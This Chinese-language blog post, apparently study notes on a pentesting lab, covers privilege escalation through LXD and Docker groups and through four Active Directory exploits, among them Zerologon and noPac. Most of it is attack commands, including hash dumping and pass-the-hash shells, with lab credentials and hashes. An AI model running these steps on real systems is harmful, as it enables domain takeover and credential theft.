@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="容器LXD、LXC 和 Docker 是三种不同的容器化技术，它们在实现和使用上有一些区别。 总结来说，LXD是基于LXC的系统级容器管理器，提供了更高级别的接口和管理工具；LXC是Linux内核提供的一种虚拟化技术，允许在单个Linux内核上运行多个隔离的用户空间实例；而Docker是基于LXC的容器化平台，提供了一套简化容器构建、分发和运行的工具和API。 LXD（Linux容器守护程序）是一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="容器&amp;域控权限提升">
+<meta property="og:url" content="https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="Ca1m">
+<meta property="og:description" content="容器LXD、LXC 和 Docker 是三种不同的容器化技术，它们在实现和使用上有一些区别。 总结来说，LXD是基于LXC的系统级容器管理器，提供了更高级别的接口和管理工具；LXC是Linux内核提供的一种虚拟化技术，允许在单个Linux内核上运行多个隔离的用户空间实例；而Docker是基于LXC的容器化平台，提供了一套简化容器构建、分发和运行的工具和API。 LXD（Linux容器守护程序）是一">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-10-16T14:51:29.000Z">
+<meta property="article:modified_time" content="2025-03-06T08:32:45.202Z">
+<meta property="article:author" content="Ca1m">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="权限提升">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="域">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>容器&amp;域控权限提升</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/01/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/sql%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/10/08/%E5%86%85%E7%BD%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&text=容器&amp;域控权限提升"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&title=容器&amp;域控权限提升"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&is_video=false&description=容器&amp;域控权限提升"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=容器&amp;域控权限提升&body=Check out this article: https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&title=容器&amp;域控权限提升"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&title=容器&amp;域控权限提升"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&title=容器&amp;域控权限提升"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&title=容器&amp;域控权限提升"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&name=容器&amp;域控权限提升&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&t=容器&amp;域控权限提升"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8"><span class="toc-number">1.</span> <span class="toc-text">容器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-LXD%E5%AE%B9%E5%99%A8"><span class="toc-number">1.1.</span> <span class="toc-text">普通用户-LXD容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-Docker%E5%AE%B9%E5%99%A8"><span class="toc-number">1.2.</span> <span class="toc-text">普通用户-Docker容器</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7"><span class="toc-number">2.</span> <span class="toc-text">域控</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WIN-AD%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83-CVE-2014-6324"><span class="toc-number">2.1.</span> <span class="toc-text">WIN-AD域控提权-CVE-2014-6324</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WIN-AD%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83-CVE-2021-42287-%E5%BD%B1%E5%93%8Dwin%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%A8%E7%B3%BB%E5%88%97%E5%88%B022"><span class="toc-number">2.2.</span> <span class="toc-text">WIN-AD域控提权-CVE-2021-42287	&#x2F;&#x2F;影响win服务器全系列到22</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WIN-AD%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83-CVE-2020-1472"><span class="toc-number">2.3.</span> <span class="toc-text">WIN-AD域控提权-CVE-2020-1472</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WIN-AD%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83-CVE-2022-26923"><span class="toc-number">2.4.</span> <span class="toc-text">WIN-AD域控提权-CVE-2022-26923</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        容器&amp;域控权限提升
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ca1m</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-16T14:51:29.000Z" class="dt-published" itemprop="datePublished">2024-10-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/">内网攻防</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web/" rel="tag">web</a>, <a class="p-category" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a>, <a class="p-category" href="/tags/%E5%9F%9F/" rel="tag">域</a>, <a class="p-category" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag">权限提升</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><p>LXD、LXC 和 Docker 是三种不同的容器化技术，它们在实现和使用上有一些区别。</p>
+<p>总结来说，LXD是基于LXC的系统级容器管理器，提供了更高级别的接口和管理工具；LXC是Linux内核提供的一种虚拟化技术，允许在单个Linux内核上运行多个隔离的用户空间实例；而Docker是基于LXC的容器化平台，提供了一套简化容器构建、分发和运行的工具和API。</p>
+<p>LXD（Linux容器守护程序）是一个系统级容器管理器，它基于LXC（Linux容器）技术。LXD提供了更高级别的接口和管理工具，使得轻松创建和管理系统容器成为可能。LXD主要面向系统级容器，可以运行完整的操作系统镜像，并提供类似于虚拟机的环境。它提供了更好的隔离性、资源控制和安全性。</p>
+<p>LXC（Linux容器）是Linux内核提供的一种虚拟化技术，它允许在单个Linux内核上运行多个隔离的用户空间实例。LXC提供了一组工具和API，用于创建和管理容器。LXC容器通常比LXD容器更加灵活和轻量级，可以定制底层操作系统的各个方面。LXC更适合于需要更细粒度控制的使用场景。</p>
+<p>Docker是一个开源的容器化平台，它建立在LXC之上，并提供了一套更高级别的工具和API，使得容器的构建、分发和运行变得更加简单。Docker提供了一个容器镜像的集装箱模型，使得容器可以在不同的环境中进行移植和部署。Docker强调容器的可移植性和易用性，适用于开发、测试和部署应用程序的场景。</p>
+<p>#利用参考：（SUID&amp;SUDO&amp;capability）</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<p>两种情况：</p>
+<p>权限在docker：</p>
+<p>逃逸 提权（宿主机）</p>
+<p>权限不在docker：</p>
+<p>借助docker应用去提权（用户归属是docker组 拉镜像 提权）</p>
+<p>下面两个例子都是获得了目标机器上的docker用户组下的用户，通过容器访问到&#x2F;root下的文件</p>
+<h2 id="普通用户-LXD容器"><a href="#普通用户-LXD容器" class="headerlink" title="普通用户-LXD容器"></a>普通用户-LXD容器</h2><p>原理：</p>
+<p>LXD是基于LXC容器的管理程序，当前用户可操作容器，</p>
+<p>理解为用户创建一个容器，再用容器挂载宿主机磁盘，</p>
+<p>最后使用容器权限操作宿主机磁盘内容达到提权效果。</p>
+<p>lxd本地提权条件:</p>
+<p>id看一下用户组</p>
+<p>-已经获得Shell</p>
+<p>-用户属于lxd组</p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/ai-web-2,357/">https://www.vulnhub.com/entry/ai-web-2,357/</a></p>
+<p>1、入口点：</p>
+<p>User: n0nr00tuser</p>
+<p>Pass: zxowieoi4sdsadpEClDws1sf</p>
+<p>2、检测及利用：</p>
+<p>.&#x2F;LinEnum.sh</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p>
+<p>3、创建容器，挂载磁盘，进入容器，进入目录提权</p>
+<p>lxc image import .&#x2F;alpine-v3.13-x86_64-20210218_0139.tar.gz –alias test</p>
+<p>lxc init test test -c security.privileged&#x3D;true</p>
+<p>lxc config device add test test disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true	&#x2F;&#x2F; 把目标机器的&#x2F;拉到镜像里的&#x2F;mnt&#x2F;root</p>
+<p>访问虚拟环境中的&#x2F;mnt&#x2F;root就相当于访问目标机器的&#x2F;</p>
+<p>lxc start test</p>
+<p>lxc exec test &#x2F;bin&#x2F;sh</p>
+<p>cd &#x2F;mnt&#x2F;root&#x2F;root</p>
+<p>cat flag.txt</p>
+<h2 id="普通用户-Docker容器"><a href="#普通用户-Docker容器" class="headerlink" title="普通用户-Docker容器"></a>普通用户-Docker容器</h2><p>把一个普通账号test添加到docker组，</p>
+<p>使用newgrp将root初始组切换为docker</p>
+<p>usermod -G docker test	把test加入到docker组</p>
+<p>newgrp docker			&#x2F;&#x2F;生效</p>
+<p>su test</p>
+<p>docker run -v &#x2F;:&#x2F;mnt -it alpine	&#x2F;&#x2F;将真机的&#x2F;放到docker的&#x2F;mnt上 ，alpine是镜像名字</p>
+<p>ls &#x2F;mnt&#x2F;root	</p>
+<p>Docker本地提权条件:</p>
+<p>1、已经获得Shell</p>
+<p>2、用户属于docker组</p>
+<p>参考：云上安全笔记的逃逸</p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/chill-hack-1,622/">https://www.vulnhub.com/entry/chill-hack-1,622/</a></p>
+<p>1、入口点：</p>
+<p>User: anurodh</p>
+<p>Pass: !d0ntKn0wmYp@ssw0rd</p>
+<p>2、检测及利用：</p>
+<p>.&#x2F;LinEnum.sh</p>
+<p>3、创建容器，挂载磁盘，进入容器，进入目录提权</p>
+<p>docker run -v &#x2F;:&#x2F;mnt -it alpine</p>
+<p>cd &#x2F;mnt&#x2F;root</p>
+<p>-基本就是获取&#x2F;etc&#x2F;shadow</p>
+<p>-写到宿主机SSH密钥</p>
+<p>-写到宿主机计划任务</p>
+<p>-CVE利用反弹</p>
+<h1 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h1><p>#实战场景：</p>
+<p>通过技术手段拿下内网域环境下某一台服务器权限或某主机上的域用户账号密码后，</p>
+<p>与AD域控网络通讯正常的情况下，可直接使用域控提权CVE漏洞进行域控权限提升。</p>
+<p>192.168.3.21是域控地址 	OWA2010CN-GOD域控主机</p>
+<h2 id="WIN-AD域控提权-CVE-2014-6324"><a href="#WIN-AD域控提权-CVE-2014-6324" class="headerlink" title="WIN-AD域控提权-CVE-2014-6324"></a>WIN-AD域控提权-CVE-2014-6324</h2><p>前提条件：</p>
+<p>1、需要域用户账号密码</p>
+<p>2、一台主机的管理员权限</p>
+<p>whoami &#x2F;user	&#x2F;&#x2F;获取当前域内用户SID值</p>
+<p>net time &#x2F;domain	&#x2F;&#x2F;查看域内控制地址</p>
+<p>net config workstation		</p>
+<p>ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址</p>
+<p>ms14-068.exe -u <a href="mailto:&#109;&#x61;&#x72;&#x79;&#x40;&#x67;&#111;&#100;&#x2e;&#x6f;&#x72;&#103;">&#109;&#x61;&#x72;&#x79;&#x40;&#x67;&#111;&#100;&#x2e;&#x6f;&#x72;&#103;</a> -p admin!@#45 -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d OWA2010CN-God.god.org		&#x2F;&#x2F;会保存票据等一些信息</p>
+<p>&#x2F;&#x2F;下面是mimikaz工具</p>
+<p>kerberos::list</p>
+<p>kerberos::purge		&#x2F;&#x2F;清除票据</p>
+<p>kerberos::ptc “<a href="mailto:&#x54;&#x47;&#x54;&#x5f;&#116;&#x65;&#115;&#116;&#x30;&#50;&#64;&#116;&#101;&#115;&#x74;&#x2e;&#x6c;&#x61;&#98;&#x2e;&#x63;&#x63;&#97;&#99;&#x68;&#101;">&#x54;&#x47;&#x54;&#x5f;&#116;&#x65;&#115;&#116;&#x30;&#50;&#64;&#116;&#101;&#115;&#x74;&#x2e;&#x6c;&#x61;&#98;&#x2e;&#x63;&#x63;&#97;&#99;&#x68;&#101;</a>“		&#x2F;&#x2F;导入票据</p>
+<p>dir\OWA2010CN-God.god.org\C$</p>
+<p>psexec \OWA2010CN-God.god.org cmd		&#x2F;&#x2F;链接域控cmd</p>
+<h2 id="WIN-AD域控提权-CVE-2021-42287-影响win服务器全系列到22"><a href="#WIN-AD域控提权-CVE-2021-42287-影响win服务器全系列到22" class="headerlink" title="WIN-AD域控提权-CVE-2021-42287	&#x2F;&#x2F;影响win服务器全系列到22"></a>WIN-AD域控提权-CVE-2021-42287	&#x2F;&#x2F;影响win服务器全系列到22</h2><p>只需要域用户账号密码</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
+<p>python3 sam_the_admin.py 域名&#x2F;‘普通用户:普通用户密码’ -dc-ip 域控IP -shell</p>
+<p>python3 sam_the_admin.py god&#x2F;‘webadmin:admin!@#45’ -dc-ip 192.168.3.21 -shell</p>
+<p>该漏洞利用完会使域内通信不正常，需要退出后再加入域内</p>
+<h2 id="WIN-AD域控提权-CVE-2020-1472"><a href="#WIN-AD域控提权-CVE-2020-1472" class="headerlink" title="WIN-AD域控提权-CVE-2020-1472"></a>WIN-AD域控提权-CVE-2020-1472</h2><p>&#x2F;&#x2F;打完需要恢复，因为域控设置空密码会影响正常域内通信 内网攻防会写怎么恢复</p>
+<p>CVE-2020-1472是继MS17010之后好用的NetLogon特权域控提权漏洞，</p>
+<p>影响Windows Server 2008R2至Windows Server 2019的多个版本系统，</p>
+<p>只要攻击者能访问到目标域控井且知道域控计算机名即可利用该漏洞.</p>
+<p>该漏洞不要求当前计算机在域内,也不要求当前计算机操作系统为Windows.</p>
+<p>计算机名：nbtscan -v -h 192.168.3.21</p>
+<p>漏洞检测：python3 zerologon_tester.py OWA2010CN-GOD 192.168.3.21</p>
+<p>重置空密码：python3 cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21</p>
+<p>连接后导出：python3 secretsdump.py god.org&#x2F;OWA2010CN-GOD$@192.168.3.21 -no-pass	&#x2F;&#x2F;导出所有hash</p>
+<p>WMI连接反弹：</p>
+<p>python3 wmiexec.py god&#x2F;<a href="mailto:&#97;&#x64;&#x6d;&#x69;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x33;&#46;&#50;&#x31;">&#97;&#x64;&#x6d;&#x69;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x33;&#46;&#50;&#x31;</a> -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7</p>
+<h2 id="WIN-AD域控提权-CVE-2022-26923"><a href="#WIN-AD域控提权-CVE-2022-26923" class="headerlink" title="WIN-AD域控提权-CVE-2022-26923"></a>WIN-AD域控提权-CVE-2022-26923</h2><p>三个利用文件</p>
+<p>在kali203中使用可能会冲突，用kali2022版本可以解决</p>
+<p>前提条件：</p>
+<p>1、一个域内普通账号</p>
+<p>2、域内存在证书服务器</p>
+<p>Kali添加访问域内信息 &#x2F;etc&#x2F;hosts</p>
+<p>192.168.3.111 xiaodi.local</p>
+<p>192.168.3.111 xiaodi-DC-CA</p>
+<p>192.168.3.111 DC.xiaodi.local</p>
+<p>获取CA结构名和计算机名</p>
+<p>certutil -config - -ping</p>
+<p>域内信息</p>
+<p>192.168.3.111</p>
+<p>test Pass123	&#x2F;&#x2F;test用户属于域内普通用户组</p>
+<p>xiaodi-DC-CA	&#x2F;&#x2F;CA名称</p>
+<p>DC.xiaodi.local	&#x2F;&#x2F;计算机名称</p>
+<p>攻击机执行&#x2F;三个利用目录，记得切换</p>
+<p>1、申请证书：（Certipy）</p>
+<p>certipy req ‘域&#x2F;test:Pass123@域控名字’ -ca xiaodi-DC-CA -template User -debug</p>
+<p>certipy req ‘xiaodi.local&#x2F;test:<a href="mailto:&#x50;&#x61;&#x73;&#x73;&#49;&#50;&#x33;&#64;&#x44;&#x43;&#46;&#x78;&#x69;&#97;&#x6f;&#100;&#x69;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#108;">&#x50;&#x61;&#x73;&#x73;&#49;&#50;&#x33;&#64;&#x44;&#x43;&#46;&#x78;&#x69;&#97;&#x6f;&#100;&#x69;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#108;</a>‘ -ca xiaodi-DC-CA -template User -debug</p>
+<p>这步操作会保存一个test.pfx文件</p>
+<p>2、检测证书（Certipy）</p>
+<p>certipy auth -pfx test.pfx</p>
+<p>3、添加用户：（bloodyAD）</p>
+<p>python3 bloodyAD.py -d xiaodi.local -u test -p ‘Pass123’ –host 192.168.3.111 addComputer pwnmachine ‘CVEPassword1234*’</p>
+<p>4、设置属性：（bloodyAD）</p>
+<p>python3 bloodyAD.py -d xiaodi.local -u test -p ‘Pass123’ –host 192.168.3.111 setAttribute ‘CN&#x3D;pwnmachine,CN&#x3D;Computers,DC&#x3D;xiaodi,DC&#x3D;local’ dNSHostName ‘[“DC.xiaodi.local”]’</p>
+<p>5、申请证书：（Certipy）</p>
+<p>certipy req ‘xiaodi.local&#x2F;pwnmachine$:CVEPassword1234*@192.168.3.111’ -template Machine -dc-ip 192.168.3.111 -ca xiaodi-DC-CA -debug	&#x2F;&#x2F;该步骤不成功就换个Certipy-main目录执行</p>
+<p>6、检测证书：（Certipy）</p>
+<p>certipy auth -pfx .&#x2F;dc.pfx -dc-ip 192.168.3.111</p>
+<p>最后会给一个hash值</p>
+<p>7、获取HASH：（impacket）</p>
+<p>python3 secretsdump.py ‘xiaodi.local&#x2F;dc$@DC.xiaodi.local’ -hashes :b6046c1026699b59301ff66341838df4</p>
+<p>8、利用HASH：（impacket）</p>
+<p>python3 wmiexec.py xiaodi.local&#x2F;<a href="mailto:&#97;&#x64;&#109;&#105;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x33;&#46;&#x31;&#49;&#x31;">&#97;&#x64;&#109;&#105;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x33;&#46;&#x31;&#49;&#x31;</a> -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8"><span class="toc-number">1.</span> <span class="toc-text">容器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-LXD%E5%AE%B9%E5%99%A8"><span class="toc-number">1.1.</span> <span class="toc-text">普通用户-LXD容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7-Docker%E5%AE%B9%E5%99%A8"><span class="toc-number">1.2.</span> <span class="toc-text">普通用户-Docker容器</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7"><span class="toc-number">2.</span> <span class="toc-text">域控</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WIN-AD%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83-CVE-2014-6324"><span class="toc-number">2.1.</span> <span class="toc-text">WIN-AD域控提权-CVE-2014-6324</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WIN-AD%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83-CVE-2021-42287-%E5%BD%B1%E5%93%8Dwin%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%A8%E7%B3%BB%E5%88%97%E5%88%B022"><span class="toc-number">2.2.</span> <span class="toc-text">WIN-AD域控提权-CVE-2021-42287	&#x2F;&#x2F;影响win服务器全系列到22</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WIN-AD%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83-CVE-2020-1472"><span class="toc-number">2.3.</span> <span class="toc-text">WIN-AD域控提权-CVE-2020-1472</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WIN-AD%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83-CVE-2022-26923"><span class="toc-number">2.4.</span> <span class="toc-text">WIN-AD域控提权-CVE-2022-26923</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/10/16/%E5%86%85%E7%BD%91/%E5%AE%B9%E5%99%A8&amp;%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83/&text=容器&amp;域控权限提升"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
